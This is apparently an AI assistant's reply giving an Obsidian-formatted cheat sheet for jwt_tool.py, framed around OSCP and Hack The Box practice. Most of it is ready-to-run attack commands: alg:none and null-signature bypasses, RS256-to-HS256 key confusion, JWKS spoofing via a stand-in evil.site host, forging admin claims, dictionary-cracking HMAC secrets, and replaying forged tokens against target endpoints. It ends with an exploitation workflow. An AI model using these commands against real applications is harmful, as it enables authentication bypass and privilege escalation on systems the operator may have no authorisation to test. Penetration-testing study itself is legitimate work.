Below is a **clean, professional, Obsidian-ready cheat sheet** for **jwt_tool.py** with:

• structured sections  
• tactical workflows  
• exploit mappings  
• real command examples  
• OSCP / HTB usage patterns  
• quick decision logic

You can paste this directly into an Obsidian note.

---

# 📌 JWT Tool – Offensive Security Cheat Sheet

> Tool: `jwt_tool.py`  
> Purpose: Decode, tamper, brute-force, exploit JWT implementations, and replay forged tokens against live targets.

---

## 🧠 JWT Structure Refresher

```
HEADER.PAYLOAD.SIGNATURE
```

Targets usually store JWT in:

• Authorization header  
• Cookie  
• POST body

---

---

# 🔍 Basic Usage

### Decode Token

```bash
python3 jwt_tool.py <JWT>
```

---

### Bare Output (tokens only)

```bash
python3 jwt_tool.py -b <JWT>
```

---

---

# 🌐 Send Token to Target Application

Replay modified JWTs directly.

```bash
python3 jwt_tool.py <JWT> \
  -t https://target/api/profile \
  -rh "Authorization: Bearer FUZZ" \
  -cv "Welcome"
```

_FUZZ is replaced automatically._

---

---

# 🚦 Scanning Modes

Automated fuzzing & detection.

|Mode|Description|
|---|---|
|pb|playbook audit|
|er|fuzz existing claims|
|cc|fuzz common claims|
|at|all tests|

---

### Run All Tests

```bash
jwt_tool.py <JWT> -M at
```

---

---

# 💣 Exploit Flags (`-X`)

|Flag|Attack|Condition|
|---|---|---|
|a|alg:none|server skips verification|
|n|null signature|parser flaw|
|b|blank key|empty HMAC secret|
|p|psychic sig|ancient ECDSA bug|
|s|spoof JWKS|server fetches attacker key|
|k|key confusion|RSA pubkey reused|
|i|inline JWKS|header JWK trusted|

---

---

## 🔴 alg:none Attack

```bash
jwt_tool.py <JWT> -X a
```

---

---

## 🔴 Null Signature

```bash
jwt_tool.py <JWT> -X n
```

---

---

## 🔴 Blank HMAC Secret

```bash
jwt_tool.py <JWT> -X b
```

---

---

## 🔴 RS256 → HS256 Confusion

Requires public key:

```bash
jwt_tool.py <JWT> -X k -pk public.pem
```

---

---

## 🔴 Spoof JWKS

Host:

```
https://evil.site/jwks.json
```

Run:

```bash
jwt_tool.py <JWT> -X s -ju https://evil.site/jwks.json
```

---

---

## 🔴 Inline JWKS Injection

```bash
jwt_tool.py <JWT> -X i
```

---

---

# 🔧 Tampering & Re-Signing

---

## Change Payload Claim

```bash
jwt_tool.py <JWT> -T -pc admin -pv true -S hs256 -p secret
```

---

---

## Modify Header

```bash
jwt_tool.py <JWT> -T -hc alg -hv HS256
```

---

---

## Inject Multiple Claims

```bash
jwt_tool.py <JWT> -I \
  -pc admin -pv true \
  -pc role -pv superuser \
  -S hs256 -p secret
```

---

---

# 🔓 Crack HS256 Secret

Dictionary attack:

```bash
jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

---

Single password:

```bash
jwt_tool.py <JWT> -C -p secret123
```

---

KID-based keyfile:

```bash
jwt_tool.py <JWT> -C -kf keys.txt
```

---

---

# 🔐 RSA Verification

Check against known key:

```bash
jwt_tool.py <JWT> -V -pk public.pem
```

---

JWKS:

```bash
jwt_tool.py <JWT> -V -jw jwks.json
```

---

---

# 📡 Replay via HTTP

---

## Cookie Token

```bash
jwt_tool.py \
  -rc "session=FUZZ" \
  -t https://target/admin \
  <JWT>
```

---

---

## POST Request

```bash
jwt_tool.py <JWT> \
  -t https://target/api/update \
  -pd "id=1&admin=1" \
  -rh "Authorization: Bearer FUZZ"
```

---

---

# 📋 Canary Detection

Detect valid token:

```bash
jwt_tool.py <JWT> \
  -t https://target/dashboard \
  -cv "Welcome back"
```

---

---

# 🧪 Proxy / Transport Controls

Disable proxy:

```bash
jwt_tool.py -np <JWT>
```

Disable redirect:

```bash
jwt_tool.py -nr <JWT>
```

---

---

# 🎯 OSCP-Style JWT Workflow

```
1. Decode token
2. Identify alg
3. Run -M at
4. If HS256 → crack
5. If RS256 → try -X k
6. Check JWKS
7. Modify admin
8. Re-sign
9. Replay
```

---

---

# 🧠 Quick Decision Table

|alg|Try First|
|---|---|
|HS256|crack (-C)|
|RS256|confusion (-X k)|
|ES256|JWKS injection|
|any|-M at|

---

---

# 📝 Sample Test Token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po
```

---

---

If you would like, next I can produce:

• JWT attacks Obsidian vault template  
• AD + JWT crossover notes  
• RS256 confusion diagrams  
• Bug bounty JWT checklist  
• Practice labs (THM / HTB)

Just say which one you want.